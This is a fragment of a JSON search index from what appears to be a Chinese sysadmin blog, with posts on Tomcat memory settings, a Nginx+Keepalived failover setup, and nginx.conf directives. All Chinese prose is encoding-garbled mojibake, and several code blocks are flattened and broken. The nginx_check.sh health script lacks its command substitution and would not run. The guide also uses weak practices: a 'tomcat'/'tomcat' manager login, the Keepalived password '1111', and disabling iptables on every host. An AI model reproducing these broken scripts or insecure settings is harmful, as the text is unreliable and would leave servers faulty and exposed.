123456åœ¨catalina.batçš„ç¬¬ä¸€è¡Œå¢åŠ ï¼š set JAVA_OPTS=-Xms64m -Xmx256m -XX:PermSize=128M -XX:MaxNewSize=256m - XX:MaxPermSize=256måœ¨catalina.shçš„ç¬¬ä¸€è¡Œå¢åŠ ï¼š JAVA_OPTS=-Xms64m -Xmx256m -XX:PermSize=128M -XX:MaxNewSize=256m XX:MaxPermSize=256m æŸ¥çœ‹Tomcatçš„JVMå†…å­˜12345678910111. Tomcat6ä¸­æ²¡æœ‰è®¾ç½®ä»»ä½•é»˜è®¤ç”¨æˆ·ï¼Œå› è€Œéœ€è¦æ‰‹åŠ¨å¾€Tomcat6çš„confæ–‡ä»¶å¤¹ä¸‹çš„tomcat-users.xmlæ–‡ä»¶ä¸­æ·»åŠ ç”¨æˆ·ã€‚å¦‚ï¼š &lt;role rolename=\"manager\"/&gt; &lt;user username=\"tomcat\" password=\"tomcat\" roles=\"manager\"/&gt; æ³¨ï¼šæ·»åŠ å®Œéœ€è¦é‡å¯Tomcat6ã€‚2. è®¿é—®http://localhost:8080/manager/statusï¼Œè¾“å…¥ä¸Šé¢æ·»åŠ çš„ç”¨æˆ·åå’Œå¯†ç ã€‚3. ç„¶ååœ¨å¦‚ä¸‹é¢çš„JVMä¸‹å¯ä»¥çœ‹åˆ°å†…å­˜çš„ä½¿ç”¨æƒ…å†µã€‚ å­¦ä¹ Tomcatç»™è‡ªå·±æ€»ç»“ã€‚","link":"/2016/06/21/WebæœåŠ¡æŠ€æœ¯/tomcat/è®°ä¸€æ¬¡çº¿ä¸Štomcatå†…å­˜ä¸è¶³é…ç½®å¹¶å‘ä¼˜åŒ–è¿‡ç¨‹/"},{"title":"Nginx+Keepalivedå®ç°é«˜å¯ç”¨Webè´Ÿè½½å‡è¡¡","text":"Nginx+Keepalivedå®ç°é«˜å¯ç”¨Webè´Ÿè½½å‡è¡¡ä¸€ã€éœ€æ±‚åœºæ™¯ï¼šé€šè¿‡ä¹‹å‰çš„ä¸€ç¯‡æ–‡ç« ï¼š Nginx+Tomcatå®ç°è´Ÿè½½å‡è¡¡,æˆ‘ä»¬å·²ç»èƒ½é€šè¿‡Nginxæ¥å®ç°Tomcatåº”ç”¨çš„è´Ÿè½½å‡è¡¡ï¼Œä½†æ˜¯å•ä¸ªçš„Nginxä¼šå­˜åœ¨å•ç‚¹éšæ‚£ï¼Œå¦‚æœNginxæŒ‚æ‰ï¼Œé‚£ä¹ˆå…¨éƒ¨çš„Tomcatåº”ç”¨éƒ½å°†å˜å¾—ä¸å¯ç”¨ï¼Œæ‰€ä»¥å®ç°Nginxçš„é«˜å¯ç”¨æ˜¯å¿…ä¸å¯å°‘çš„ä¸€æ­¥ã€‚ äºŒã€è¯´æ˜ é«˜å¯ç”¨ HAï¼ˆHigh Availabilityï¼‰ï¼Œç®€å•è®²å°±æ˜¯ï¼šæˆ‘æŸä¸ªåº”ç”¨æŒ‚äº†ï¼Œè‡ªåŠ¨æœ‰å¦å¤–åº”ç”¨èµ·æ¥æ¥ç€æ‰›ç€ï¼Œè‡´ä½¿æ•´ä¸ªæœåŠ¡å¯¹å¤–æ¥çœ‹æ˜¯æ²¡æœ‰ä¸­æ–­è¿‡çš„ã€‚è¿™é‡Œçš„é‡ç‚¹å°±æ˜¯ä¸ä¸­æ–­ï¼Œè‡´ä½¿å…¬å¸æ•´ä¸ªä¸šåŠ¡èƒ½ä¸æ–­è¿›è¡Œä¸­ï¼ŒæŠŠå½±å“å‡åˆ°æœ€å°ï¼Œèµšå¾—æ›´å¤šã€‚ å› ä¸ºè¦ä¸ä¸­æ–­ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°äº† Keepalivedã€‚Keepalived ä¸€èˆ¬ä¸ä¼šå•ç‹¬ä½¿ç”¨ï¼ŒåŸºæœ¬éƒ½æ˜¯è·Ÿè´Ÿè½½å‡è¡¡è½¯ä»¶ï¼ˆLVSã€HAProxyã€Nginxï¼‰ä¸€èµ·å·¥ä½œæ¥è¾¾åˆ°é›†ç¾¤çš„é«˜å¯ç”¨æ•ˆæœã€‚ Keepalived æœ‰åŒä¸»ã€ä¸»å¤‡æ–¹æ¡ˆ å¸¸ç”¨è¯ï¼š å¿ƒè·³ï¼šMaster ä¼šä¸»åŠ¨ç»™ Backup å‘é€å¿ƒè·³æ£€æµ‹åŒ…ä»¥åŠå¯¹å¤–çš„ç½‘ç»œåŠŸèƒ½ï¼Œè€Œ Backup è´Ÿè´£æ¥æ”¶ Master çš„å¿ƒè·³æ£€æµ‹åŒ…ï¼Œéšæ—¶å‡†å¤‡æ¥ç®¡ä¸»æœºã€‚ä¸ºä»€ä¹ˆå«å¿ƒè·³ä¸çŸ¥é“ï¼Œä½†æ˜¯æŒºå½¢è±¡çš„ï¼Œå¿ƒè·³åŒæ­¥ã€‚ é€‰ä¸¾ï¼šKeepalived é…ç½®çš„æ—¶å€™å¯ä»¥æŒ‡å®šå„å°ä¸»æœºä¼˜å…ˆçº§ï¼ŒMaster æŒ‚äº†ï¼Œå„å° Backup è¦é€‰ä¸¾å‡ºä¸€ä¸ªæ–°çš„ Masterã€‚ Keepalived å®˜ç½‘ï¼šhttp://www.keepalived.org/ å®˜ç½‘ä¸‹è½½ï¼šhttp://www.keepalived.org/download.html å®˜ç½‘æ–‡æ¡£ï¼šhttp://www.keepalived.org/documentation.html ä¸‰ã€æ­å»º è½¯ä»¶ç‰ˆæœ¬ï¼š Nginxï¼š1.8.1 Keepalivedï¼š1.2.20 JDKï¼š8u72 Tomcatï¼š8.0.32 éƒ¨ç½²ç¯å¢ƒï¼ˆä¸‹æ–‡ä¸­ä»¥ç¬¬å‡ å°æ¥ä»£è¡¨è¿™äº›ä¸»æœºï¼‰ï¼š è™šæ‹Ÿ IPï¼ˆVIPï¼‰ï¼š192.168.1.50 ç¬¬ä¸€å°ä¸»æœºï¼šNginx 1 + Keepalived 1 == 192.168.1.120ï¼ˆMasterï¼‰ ç¬¬äºŒå°ä¸»æœºï¼šNginx 2 + Keepalived 2 == 192.168.1.121ï¼ˆBackup) ç¬¬ä¸‰å°ä¸»æœºï¼šTomcat 1 == 192.168.1.122ï¼ˆWeb 1ï¼‰ ç¬¬å››å°ä¸»æœºï¼šTomcat 2 == 192.168.1.123ï¼ˆWeb 2ï¼‰ æ‰€æœ‰æœºå­è¿›è¡Œæ—¶é—´æ ¡å‡†ï¼šNTPï¼ˆNetwork Time Protocolï¼‰ä»‹ç» ç¬¬ä¸‰ã€ç¬¬å››å°ä¸»æœºéƒ¨ç½²ï¼š JDK çš„å®‰è£…ï¼šJDK å®‰è£… Tomcat çš„å®‰è£…ï¼šTomcat å®‰è£…å’Œé…ç½®ã€ä¼˜åŒ– ç¬¬ä¸€ã€äºŒå°ä¸»æœºéƒ¨ç½²ï¼ˆä¸¤å°éƒ¨ç½²å†…å®¹ä¸€æ ·ï¼‰ï¼š Nginx çš„å®‰è£…ï¼šNginx å®‰è£…å’Œé…ç½® å››ã€Keepalivedå®‰è£…123456789101112131415161718192021222324å®‰è£…ä¾èµ–ï¼š# sudo yum install -y gcc openssl-devel popt-develä¸Šä¼ æˆ–ä¸‹è½½ keepalived &amp; è§£å‹åŒ…ï¼šcd /opt/setups/; # tar zxvf keepalived-1.2.20.tar.gzç¼–è¯‘ï¼š# cd /opt/setups/keepalived-1.2.20 ; # ./configure --prefix=/usr/local/keepalivedç¼–è¯‘å®‰è£…ï¼š# make &amp;&amp; make installKeepalived è®¾ç½®æœåŠ¡å’Œéšæœºå¯åŠ¨å¤åˆ¶é…ç½®æ–‡ä»¶åˆ°å¯åŠ¨è„šæœ¬ç›®å½•ï¼š# cp /usr/program/keepalived/etc/rc.d/init.d/keepalived /etc/init.d/keepalived# cp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/# ln -s /usr/local/sbin/keepalived /usr/sbin/# ln -s /usr/local/keepalived/sbin/keepalived /sbin/è®¾ç½®keepalivedæœåŠ¡å¼€æœºå¯åŠ¨ï¼š # chkconfig keepalived onå¢åŠ æƒé™# chmod +x /etc/init.d/keepalived Keepalived é…ç½®123456æ·»åŠ ç¯å¢ƒå˜é‡ï¼švim /etc/profileKEEPALIVED_HOME=/usr/local/keepalivedPATH=$PATH:$KEEPALIVED_HOME/sbinexport KEEPALIVED_HOMEexport PATH åˆ·æ–°ç¯å¢ƒå˜é‡ï¼šsource /etc/profile æ£€æµ‹ç¯å¢ƒå˜é‡ï¼škeepalived -v 123vim /usr/local/keepalived/etc/sysconfig/keepalivedæŠŠ 14 è¡Œçš„ï¼šKEEPALIVED_OPTIONS=\"-D\"ï¼Œæ”¹ä¸ºï¼šKEEPALIVED_OPTIONS=\"-D -f /usr/local/keepalived/etc/keepalived/keepalived.conf\" ç¬¬ä¸€ã€äºŒå°ä¸»æœºé…ç½®ï¼ˆä¸¤å°åœ¨ Keepalived é…ç½®ä¸Šç¨å¾®æœ‰ä¸ä¸€æ ·ï¼‰ï¼š 123456789å¥åº·ç›‘æµ‹è„šæœ¬ï¼ˆæˆ‘ä¸ªäººæ”¾åœ¨ï¼š/opt/bash ç›®å½•ä¸‹ï¼‰ï¼š[nginx_check.sh](Keepalived-Settings/nginx_check.sh)å¥åº·ç›‘æµ‹è„šæœ¬æ·»åŠ æ‰§è¡Œæƒé™ï¼šchmod 755 /opt/bash/nginx_check.shè¿è¡Œç›‘æµ‹è„šæœ¬ï¼Œçœ‹ä¸‹æ˜¯å¦æœ‰é—®é¢˜ï¼šsh /opt/bash/nginx_check.shï¼Œå¦‚æœæ²¡æœ‰æŠ¥é”™ï¼Œåˆ™è¡¨ç¤ºæ”¹è„šæœ¬æ²¡æœ‰é—®é¢˜.è¿™ä¸ªè„šæœ¬å¾ˆé‡è¦ï¼Œå¦‚æœè„šæœ¬æ²¡æ³•ç”¨ï¼Œåœ¨å¯ç”¨ Keepalived çš„æ—¶å€™å¯èƒ½ä¼šæŠ¥ï¼šKeepalived_vrrp[5684]: pid 5959 exited with status 1 nginx é…ç½®ï¼ˆä¸¤å°ä¸€æ ·é…ç½®ï¼‰ï¼š 123456789101112131415161718192021222324252627282930worker_processes 1; events &#123; worker_connections 1024; &#125; http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; # ï¼ˆé‡ç‚¹ï¼‰ upstream tomcatCluster &#123; server 192.168.1.122:8080 weight=1; server 192.168.1.123:8080 weight=1; &#125; # ï¼ˆé‡ç‚¹ï¼‰ server &#123; listen 80; server_name 192.168.1.50; location / &#123; proxy_pass http://tomcatCluster; index index.html index.htm; &#125; &#125; &#125; 4.1 ä¿®æ”¹keepalivedé…ç½®æ–‡ä»¶cat /etc/init.d/keepalived 1234567891011121314151617181920212223242526272829! Configuration File for keepalivedglobal_defs &#123;keepalived è‡ªå¸¦çš„é‚®ä»¶æé†’éœ€è¦å¼€å¯ sendmail æœåŠ¡ã€‚å»ºè®®ç”¨ç‹¬ç«‹çš„ç›‘æ§æˆ–ç¬¬ä¸‰æ–¹ SMTProuter_id edu-proxy-01 ## æ ‡è¯†æœ¬èŠ‚ç‚¹çš„å­—æ¡ä¸²,é€šå¸¸ä¸º hostname &#125;keepalived ä¼šå®šæ—¶æ‰§è¡Œè„šæœ¬å¹¶å¯¹è„šæœ¬æ‰§è¡Œçš„ç»“æœè¿›è¡Œåˆ†æ,åŠ¨æ€è°ƒæ•´ vrrp_instance çš„ä¼˜å…ˆçº§ã€‚å¦‚æœ è„šæœ¬æ‰§è¡Œç»“æœä¸º 0,å¹¶ä¸” weight é…ç½®çš„å€¼å¤§äº 0,åˆ™ä¼˜å…ˆçº§ç›¸åº”çš„å¢åŠ ã€‚å¦‚æœè„šæœ¬æ‰§è¡Œç»“æœé 0,å¹¶ä¸” weight é…ç½®çš„å€¼å°äº 0,åˆ™ä¼˜å…ˆçº§ç›¸åº”çš„å‡å°‘ã€‚å…¶ä»–æƒ…å†µ,ç»´æŒåŸæœ¬é…ç½®çš„ä¼˜å…ˆçº§,å³é…ç½®æ–‡ä»¶ä¸­ priority å¯¹åº” çš„å€¼ã€‚vrrp_script chk_nginx &#123;script \"/etc/keepalived/nginx_check.sh\" interval 2 ## æ£€æµ‹æ—¶é—´é—´éš”weight -20 ## å¦‚æœæ¡ä»¶æˆç«‹,æƒé‡-20&#125;æ£€æµ‹ nginx çŠ¶æ€çš„è„šæœ¬è·¯å¾„å®šä¹‰è™šæ‹Ÿè·¯ç”±,VI_1 ä¸ºè™šæ‹Ÿè·¯ç”±çš„æ ‡ç¤ºç¬¦,è‡ªå·±å®šä¹‰åç§°vrrp_instance VI_1 &#123;state MASTER ## ä¸»èŠ‚ç‚¹ä¸º MASTER,å¯¹åº”çš„å¤‡ä»½èŠ‚ç‚¹ä¸º BACKUPinterface eth1 ## ç»‘å®šè™šæ‹Ÿ IP çš„ç½‘ç»œæ¥å£,ä¸æœ¬æœº IP åœ°å€æ‰€åœ¨çš„ç½‘ç»œæ¥å£ç›¸åŒ,æˆ‘çš„æ˜¯ eth1 virtual_router_id 51 ## è™šæ‹Ÿè·¯ç”±çš„ ID å·,ä¸¤ä¸ªèŠ‚ç‚¹è®¾ç½®å¿…é¡»ä¸€æ ·,å¯é€‰ IP æœ€åä¸€æ®µä½¿ç”¨, ç›¸åŒçš„ VRID ä¸ºä¸€ä¸ªç»„,ä»–å°†å†³å®šå¤šæ’­çš„ MAC åœ°å€ï¼Œeth1å€¼çš„è·å–å¯ä»¥åœ¨æœºå™¨ä¸Šæ‰§è¡Œifconfigå‘½ä»¤å¾—åˆ°mcast_src_ip 192.168.1.51## æœ¬æœº IP åœ°å€priority 100 ## èŠ‚ç‚¹ä¼˜å…ˆçº§,å€¼èŒƒå›´ 0-254,MASTER è¦æ¯” BACKUP é«˜ nopreempt ## ä¼˜å…ˆçº§é«˜çš„è®¾ç½® nopreempt è§£å†³å¼‚å¸¸æ¢å¤åå†æ¬¡æŠ¢å çš„é—®é¢˜ advert_int 1 ## ç»„æ’­ä¿¡æ¯å‘é€é—´éš”,ä¸¤ä¸ªèŠ‚ç‚¹è®¾ç½®å¿…é¡»ä¸€æ ·,é»˜è®¤ 1s ## è®¾ç½®éªŒè¯ä¿¡æ¯,ä¸¤ä¸ªèŠ‚ç‚¹å¿…é¡»ä¸€è‡´authentication &#123; auth_type PASSauth_pass 1111 ## çœŸå®ç”Ÿäº§,æŒ‰éœ€æ±‚å¯¹åº”è¯¥è¿‡æ¥ &#125;å°† track_script å—åŠ å…¥ instance é…ç½®å—.track_script &#123;chk_nginx ## æ‰§è¡Œ Nginx ç›‘æ§çš„æœåŠ¡&#125;è™šæ‹Ÿ IP æ± , ä¸¤ä¸ªèŠ‚ç‚¹è®¾ç½®å¿…é¡»ä¸€æ ·virtual_ipaddress &#123;192.168.1.50 ## è™šæ‹Ÿ ip,å¯ä»¥å®šä¹‰å¤šä¸ª&#125; &#125; Keepalived é…ç½®æ–‡ä»¶ç¼–è¾‘ï¼ˆç¬¬ä¸€ã€äºŒå°é…ç½®ç¨å¾®ä¸åŒï¼Œä¸åŒç‚¹å…·ä½“çœ‹ä¸‹é¢é‡ç‚¹è¯´æ˜ï¼‰ ç¼–è¾‘ï¼švim /usr/local/keepalived/etc/keepalived/keepalived.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556! Configuration File for keepalived # å…¨å±€é…ç½® global_defs &#123; # é‚®ç®±é€šçŸ¥é…ç½®ï¼Œkeepalived åœ¨å‘ç”Ÿåˆ‡æ¢æ—¶éœ€è¦å‘é€ email åˆ°çš„å¯¹è±¡ï¼Œä¸€è¡Œä¸€ä¸ª notification_email &#123; #acassen@firewall.loc #failover@firewall.loc #sysadmin@firewall.loc &#125; # æŒ‡å®šå‘ä»¶äºº #notification_email_from Alexandre.Cassen@firewall.loc # æŒ‡å®šsmtpæœåŠ¡å™¨åœ°å€ #smtp_server 192.168.200.1 # æŒ‡å®šsmtpè¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•ä½ç§’ #smtp_connect_timeout 30 router_id LVS_DEVEL vrrp_skip_check_adv_addr vrrp_strict&#125; # ï¼ˆé‡ç‚¹ï¼‰è„šæœ¬ç›‘æ§å®ç° vrrp_script check_nginx &#123; # è¿è¡Œè„šæœ¬ script \"/opt/bash/nginx_check.sh\" # æ—¶é—´é—´éš”ï¼Œ2ç§’ interval 2 # æƒé‡ weight 2 &#125; vrrp_instance VI_1 &#123; # ï¼ˆé‡ç‚¹ï¼‰Backup æœºå­è¿™é‡Œæ˜¯è®¾ç½®ä¸ºï¼šBACKUP state MASTER interface eth0 virtual_router_id 51 # ï¼ˆé‡ç‚¹ï¼‰Backup æœºå­è¦å°äºå½“å‰ Master è®¾ç½®çš„ 100ï¼Œå»ºè®®è®¾ç½®ä¸º 99 priority 100 # Master ä¸ Backup è´Ÿè½½å‡è¡¡å™¨ä¹‹é—´åŒæ­¥æ£€æŸ¥çš„æ—¶é—´é—´éš”ï¼Œå•ä½æ˜¯ç§’ advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; # ï¼ˆé‡ç‚¹ï¼‰é…ç½®è™šæ‹Ÿ IP åœ°å€ï¼Œå¦‚æœæœ‰å¤šä¸ªåˆ™ä¸€è¡Œä¸€ä¸ª virtual_ipaddress &#123; 192.168.1.50 &#125; # ï¼ˆé‡ç‚¹ï¼‰è„šæœ¬ç›‘æ§è°ƒç”¨ track_script &#123; check_nginx &#125; &#125; é™„å½•ï¼š192.168.31.146ï¼ˆMASTERèŠ‚ç‚¹ï¼‰çš„keepalived.conf 12345678910111213141516171819202122232425262728! Configuration File for keepalivedglobal_defs &#123; router_id dreyer-zk-03&#125;vrrp_script chk_nginx &#123; script \"/etc/keepalived/nginx_check.sh\" interval 2 weight -20&#125;vrrp_instance VI_1 &#123; state MASTER interface eth0 virtual_router_id 146 mcast_src_ip 192.168.1.120 priority 100 nopreempt advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; track_script &#123; chk_nginx &#125; virtual_ipaddress &#123; 192.168.31.111 &#125;&#125; 192.168.31.154ï¼ˆBACKUPèŠ‚ç‚¹ï¼‰çš„keepalived.conf 123456789101112131415161718192021222324252627! Configuration File for keepalivedglobal_defs &#123; router_id dreyer-zk-01&#125;vrrp_script chk_nginx &#123; script \"/etc/keepalived/nginx_check.sh\" interval 2 weight -20&#125;vrrp_instance VI_1 &#123; state BACKUP interface eth0 virtual_router_id 146 mcast_src_ip 192.168.1.121 priority 90 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; track_script &#123; chk_nginx &#125; virtual_ipaddress &#123; 192.168.31.111 &#125;&#125; nginx_check.shï¼ˆNginxçŠ¶æ€æ£€æµ‹è„šæœ¬ï¼‰12345678#!/bin/bashA=ps -C nginx â€“no-header |wc -lif [ $A -eq 0 ];then /usr/local/nginx/sbin/nginx sleep 2 if [ps -C nginx --no-header |wc -l-eq 0 ];then killall keepalived fifi è„šæœ¬å¤§æ„ä¸ºï¼šæ£€æŸ¥æ˜¯å¦æœ‰nginxè¿›ç¨‹ï¼Œå¦‚æœæ²¡æœ‰ï¼Œé‚£ä¹ˆå°±å¯åŠ¨nginxï¼Œå¯åŠ¨åç¡çœ 2ç§’ï¼Œå†æ£€æŸ¥æ˜¯å¦æœ‰nginxçš„è¿›ç¨‹ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œé‚£ä¹ˆå°±æ€æ‰keepalivedçš„å…¨éƒ¨è¿›ç¨‹ï¼ˆæ€æ‰è¿›ç¨‹åkeepalivedæ‰èƒ½è¿›è¡Œé‡æ–°é€‰ä¸¾ï¼‰ å¯åŠ¨å„è‡ªæœåŠ¡1234567891011121314151617å››å°æœºå­éƒ½åœæ‰é˜²ç«å¢™ï¼šservice iptables stopå…ˆå¯åŠ¨ä¸¤å° Tomcatï¼šsh /usr/program/tomcat8/bin/startup.sh tail -200f /usr/program/tomcat8/logs/catalina.outæ£€æŸ¥ä¸¤å° Tomcat æ˜¯å¦å¯ä»¥å•ç‹¬è®¿é—®ï¼Œæœ€å¥½ç»™é¦–é¡µåŠ ä¸Šä¸åŒæ ‡è¯†ï¼Œå¥½æ–¹ä¾¿ç­‰ä¸‹ç¡®è®¤æ˜¯å¦æœ‰è´Ÿè½½. http://192.168.1.122:8080 http://192.168.1.123:8080å¯åŠ¨ä¸¤å° Nginx æœåŠ¡ï¼š/usr/local/nginx/sbin/nginx å¯åŠ¨ä¸¤å° Keepalived æœåŠ¡ï¼šservice keepalived startæŸ¥çœ‹ Master å’Œ Backup ä¸¤å°ä¸»æœºçš„å¯¹åº”æ—¥å¿—ï¼štail -f /var/log/messages é«˜å¯ç”¨æµ‹è¯•æ¨¡æ‹Ÿ Keepalived æŒ‚æ‰å…³é—­Masterä¸»æœºçš„Keepalivedï¼ŒæŸ¥çœ‹ Master å’Œ Backupä¸¤å°ä¸»æœºçš„å¯¹åº”æ—¥å¿—ï¼š 1tail -f /var/log/messages å…³é—­æœåŠ¡ï¼š 1service keepalived stop å¦‚æœç¬¬äºŒå°æœºæ¥ç®¡äº†ï¼Œåˆ™è¡¨ç¤ºæˆåŠŸé‡æ–°å¼€å¯ Master ä¸»æœºçš„ Keepalivedï¼ŒæŸ¥çœ‹ Master å’Œ Backup ä¸¤å°ä¸»æœºçš„å¯¹åº”æ—¥å¿—ï¼š 1tail -f /var/log/messages é‡å¯æœåŠ¡ï¼šservice keepalived restart å¦‚æœç¬¬ä¸€å°æœºé‡æ–°æ¥ç®¡äº†ï¼Œåˆ™è¡¨ç¤ºæˆåŠŸ æ¨¡æ‹Ÿ Nginx æŒ‚æ‰ å…³é—­ Master ä¸»æœºçš„ Nginxï¼ŒæŸ¥çœ‹ Master å’Œ Backup ä¸¤å°ä¸»æœºçš„å¯¹åº”æ—¥å¿—ï¼š 1tail -f /var/log/messages å…³é—­æœåŠ¡ï¼š/usr/local/nginx/sbin/nginx -s stopå¦‚æœç¬¬äºŒå°æœºæ¥ç®¡äº†ï¼Œåˆ™è¡¨ç¤ºæˆåŠŸé‡æ–°å¼€å¯ Master ä¸»æœºçš„ Nginxï¼ŒæŸ¥çœ‹ Master å’Œ Backup ä¸¤å°ä¸»æœºçš„å¯¹åº”æ—¥å¿—ï¼š 1tail -f /var/log/messages é‡å¯ Nginx æœåŠ¡ï¼š/usr/local/nginx/sbin/nginx -s reload é‡å¯ Keepalived æœåŠ¡ï¼šservice keepalived restart å¦‚æœç¬¬ä¸€å°æœºé‡æ–°æ¥ç®¡äº†ï¼Œåˆ™è¡¨ç¤ºæˆåŠŸ å¯ä»¥ä¼˜åŒ–çš„åœ°æ–¹ï¼Œæ”¹ä¸ºåŒä¸»çƒ­å¤‡ï¼Œç›‘æ§è„šæœ¬ä¸Šå¸¦æœ‰è‡ªå¯åŠ¨ç›¸å…³ç»†èŠ‚ï¼Œåç»­å†è¿›è¡Œã€‚ æ—¥å¿—ä¸­å¸¸ç”¨çš„å‡ å¥è¯è§£é‡Šï¼š 12345- `Entering to MASTER STATE`ï¼Œå˜æˆ Master çŠ¶æ€ - `Netlink reflector reports IP 192.168.1.50 added`ï¼Œä¸€èˆ¬å˜ä¸º Master çŠ¶æ€ï¼Œéƒ½è¦é‡æ–°åŠ å…¥è™šæ‹Ÿ IPï¼Œä¸€èˆ¬å«æ³•å«åšï¼šè™šæ‹Ÿ IP é‡æ–°æ¼‚ç§»åˆ° Master æœºå­ä¸Š- `Entering BACKUP STATE`ï¼Œå˜æˆ Backup çŠ¶æ€ - `Netlink reflector reports IP 192.168.1.50 removed`ï¼Œä¸€èˆ¬å˜ä¸º Backup çŠ¶æ€ï¼Œéƒ½è¦ç§»å‡ºè™šæ‹Ÿ IPï¼Œä¸€èˆ¬å«æ³•å«åšï¼šè™šæ‹Ÿ IP é‡æ–°æ¼‚ç§»åˆ° Master æœºå­ä¸Š- `VRRP_Script(check_nginx) succeeded`ï¼Œç›‘æ§è„šæœ¬æ‰§è¡ŒæˆåŠŸ èµ„æ–™ http://xutaibao.blog.51cto.com/7482722/1669123 https://m.oschina.net/blog/301710 http://blog.csdn.net/u010028869/article/details/50612571 http://blog.csdn.net/wanglei_storage/article/details/51175418","link":"/2016/05/22/WebæœåŠ¡æŠ€æœ¯/Nginx/Nginx+Keepalivedå®ç°é«˜å¯ç”¨Webè´Ÿè½½å‡è¡¡ /"},{"title":"NginxåŸºç¡€ç¯‡-Nginx.confé…ç½®æ–‡ä»¶è¯¦è§£","text":"Nginx.confé…ç½®æ–‡ä»¶è¯¦è§£Nginxé…ç½®æ–‡ä»¶ä¸»è¦åˆ†æˆå››éƒ¨åˆ†ï¼šmainï¼ˆå…¨å±€è®¾ç½®ï¼‰ã€serverï¼ˆä¸»æœºè®¾ç½®ï¼‰ã€upstreamï¼ˆä¸Šæ¸¸æœåŠ¡å™¨è®¾ç½®ï¼Œä¸»è¦ä¸ºåå‘ä»£ç†ã€è´Ÿè½½å‡è¡¡ç›¸å…³é…ç½®ï¼‰å’Œ locationï¼ˆURLåŒ¹é…ç‰¹å®šä½ç½®åçš„è®¾ç½®ï¼‰ï¼Œæ¯éƒ¨åˆ†åŒ…å«è‹¥å¹²ä¸ªæŒ‡ä»¤ã€‚mainéƒ¨åˆ†è®¾ç½®çš„æŒ‡ä»¤å°†å½±å“å…¶å®ƒæ‰€æœ‰éƒ¨åˆ†çš„è®¾ç½®ï¼›serveréƒ¨åˆ†çš„æŒ‡ä»¤ä¸»è¦ç”¨äºæŒ‡å®šè™šæ‹Ÿä¸»æœºåŸŸåã€IPå’Œç«¯å£ï¼›upstreamçš„æŒ‡ä»¤ç”¨äºè®¾ç½®ä¸€ç³»åˆ—çš„åç«¯æœåŠ¡å™¨ï¼Œè®¾ç½®åå‘ä»£ç†åŠåç«¯æœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡ï¼›locationéƒ¨åˆ†ç”¨äºåŒ¹é…ç½‘é¡µä½ç½®ï¼ˆæ¯”å¦‚ï¼Œæ ¹ç›®å½•â€œ/â€,â€œ/imagesâ€,ç­‰ç­‰ï¼‰ã€‚ä»–ä»¬ä¹‹é—´çš„å…³ç³»å¼ï¼šserverç»§æ‰¿mainï¼Œlocationç»§æ‰¿serverï¼›upstreamæ—¢ä¸ä¼šç»§æ‰¿æŒ‡ä»¤ä¹Ÿä¸ä¼šè¢«ç»§æ‰¿ã€‚å®ƒæœ‰è‡ªå·±çš„ç‰¹æ®ŠæŒ‡ä»¤ï¼Œä¸éœ€è¦åœ¨å…¶ä»–åœ°æ–¹çš„åº”ç”¨ã€‚ å½“å‰nginxæ”¯æŒçš„å‡ ä¸ªæŒ‡ä»¤ä¸Šä¸‹æ–‡ï¼š 2.1 é€šç”¨ä¸‹é¢çš„nginx.confç®€å•çš„å®ç°nginxåœ¨å‰ç«¯åšåå‘ä»£ç†æœåŠ¡å™¨çš„ä¾‹å­ï¼Œå¤„ç†jsã€pngç­‰é™æ€æ–‡ä»¶ï¼Œjspç­‰åŠ¨æ€è¯·æ±‚è½¬å‘åˆ°å…¶å®ƒæœåŠ¡å™¨tomcatï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159#å®šä¹‰Nginxè¿è¡Œçš„ç”¨æˆ·å’Œç”¨æˆ·user www www;#nginxè¿›ç¨‹æ•°ï¼Œå»ºè®®è®¾ç½®ä¸ºç­‰äºCPUæ€»æ ¸å¿ƒæ•°ã€‚è¿™é‡Œæˆ‘æœåŠ¡å™¨4æ ¸worker_processes 4;#ä¸€ä¸ª1æ ¸CPUå¯¹åº”ä¸€ä¸ªè¿›ç¨‹æ•°ç®¡ç†ã€‚è¿™æ ·èƒ½å¾ˆå¥½åˆ†é…èµ„æºã€‚worker_cpu_affinity 00000001 00000010 00000100 00001000; #å…¨å±€é”™è¯¯æ—¥å¿—å®šä¹‰ç±»å‹ï¼Œ[ debug | info | notice | warn | error | crit ]error_log /var/log/nginx/error.log info;#è¿›ç¨‹æ–‡ä»¶pid /var/run/nginx.pid;#ä¸€ä¸ªnginxè¿›ç¨‹æ‰“å¼€çš„æœ€å¤šæ–‡ä»¶æè¿°ç¬¦æ•°ç›®ï¼Œç†è®ºå€¼åº”è¯¥æ˜¯æœ€å¤šæ‰“å¼€æ–‡ä»¶æ•°ï¼ˆç³»ç»Ÿçš„å€¼ulimit -nï¼‰ä¸nginxè¿›ç¨‹æ•°ç›¸é™¤ï¼Œä½†æ˜¯nginxåˆ†é…è¯·æ±‚å¹¶ä¸å‡åŒ€ï¼Œæ‰€ä»¥å»ºè®®ä¸ulimit -nçš„å€¼ä¿æŒä¸€è‡´ã€‚worker_rlimit_nofile 65535;#å·¥ä½œæ¨¡å¼ä¸è¿æ¥æ•°ä¸Šé™events&#123;#å‚è€ƒäº‹ä»¶æ¨¡å‹ï¼Œuse [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epollæ¨¡å‹æ˜¯Linux 2.6ä»¥ä¸Šç‰ˆæœ¬å†…æ ¸ä¸­çš„é«˜æ€§èƒ½ç½‘ç»œI/Oæ¨¡å‹ï¼Œå¦‚æœè·‘åœ¨FreeBSDä¸Šé¢ï¼Œå°±ç”¨kqueueæ¨¡å‹ã€‚use epoll;#å•ä¸ªè¿›ç¨‹æœ€å¤§è¿æ¥æ•°ï¼ˆæœ€å¤§è¿æ¥æ•°=è¿æ¥æ•°*è¿›ç¨‹æ•°ï¼‰worker_connections 65535;&#125;#è®¾å®šhttpæœåŠ¡å™¨http&#123;include mime.types; 